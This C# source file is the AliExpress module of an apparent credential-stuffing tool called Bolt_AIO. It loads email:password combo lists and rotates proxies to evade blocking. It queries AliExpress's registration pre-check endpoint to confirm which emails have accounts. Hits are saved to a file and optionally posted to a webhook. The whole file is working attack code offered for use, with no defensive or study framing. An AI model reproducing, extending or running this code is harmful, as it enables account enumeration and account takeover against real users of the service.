using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Aliexpressmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent =
                                "Mozilla/5.0 (Linux; Android 5.1.1; SM-N950N Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var text2 = req
                                .Get(
                                    "https://login.aliexpress.com/join/preCheckForRegister.htm?registerFrom=AE_MAIN_POPUP_WHOLESALE&umidToken=TF8667EB6100A86A003D1394117BC098531BE493439628104133F08A610&ua=121%23%2FYnlk%2Fa66JQlVlhdG8AelLTlA0fNT33VOnraqEg2vw7DKxJnEEpSlhyY8psdK5jVllKY%2BzPIDMlSAQOZZLQPll9YAcWZKujVVyeH4FJ5KM9lOlrJEGiIlMLYAcfdK5jVlmuY%2BapIxM9VO3rnEkDIll9YOc8dKkjVlwgZZgz4XluVS0bvsbc9MtFPe6GG62ibYnsshu%2FmCjVDkeILF9K0bZs0JnCVMZujhLzT83%2Fybbi0CNk1INn0lPi0n6XSp2D0kZ748u%2FmCbibCeIaFtWbbZrDnnx9pCibCZ0T83BhC6ibBZRXB9hWMZecnzgmunYsUueNIG%2Fm7%2FibvehuddcVC6ibn5u9lfAHASYrvd0P1hdYMiBzHDlG1xhSAXe2Dp5YLO7aWyVA%2BDZKhnH1NiATHbEtUNISsaxdYZ9JlCSwwX5pMXwc8lSgokSUKkFgeP1eO1B8mXC2MYwSfvzuZ%2FvPVHwANcTEnu3J9F2wjA2%2FSdncze%2B72x4i56LOdJqyOCgEhs4TtfNNLb0zTryXyyaDcmdDeaRtp6fmiuYnh8kAdtewMVr9ngS9QM0udY13dLJgrnu6FkyC2i2lYQ9hGC5xcJ72YIp8OUNcwzQulMbnIDxmTB8XLh8LedQCmyaxpiVCVzWAVAWziRGif4CKGP4wE5AowYwdYMnOUF0Sg2QTOBvyuGCCJxkdozXdCPpIJQfQOwq13VkWq8OxJ9X9OqtPv4iq3S%2FpUTxs6p9z7qpN0fEUVBpfZwZqgdX0vdo8z0gW1bgXtszPBMdT7YaQoTtLAVqoQ899JeNmu7LN6yPaClZUkeojQ7DFzKlWratog0OIPp31Erenh%2BofLciibLpzqPzHnb8ulHCZhYBDDobTeeM2aHejvSs7SEWQTIzcwH0dwN5pFU1Uvg1NtW6d8mXeAWroHIiNvKeqRWc76A%2BbSu7nL0CFIZKezWp5hFZa6cT13T6WJ%2FkgHzGtSYO%2B80Z4D6omU%2FAByCPOlsotsO269hynZscAXTgD4wt9fz2Ge%2BAMy3lGRP9GnONcP0Zac5J%2BDA9JD0gkOo%2FYCBngFPJhRDKEzcXngKhvb7HQWZU3mDAJ3U7DP7TQujUgBclZ6%2B3d%2BVQO3DUs1CPOpfljgMRHYgOjp2fdca63StbJ1ciUc4UvLzc0jrKYFl2wjv4amBWosw%3D%3D&email=" +
                                    array[0]).ToString();
                            var flag7 = text2.Contains(",\"isEmailExisted\":true");

                            if (flag7)
                            {
                                Program.Hits++;
                                Program.TotalChecks++;
                                Export.AsResult("/Aliexpress_hits", array[0] + ":" + array[1]);
                                if (Program.lorc == "LOG") Settings.PrintHit("Aliexpress", array[0] + ":" + array[1]);
                                if (Settings.sendToWebhook)
                                    Settings.sendTowebhook1(array[0] + ":" + array[1], "Aliexpress Hits");
                            }
                            else
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                            req.Dispose();
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}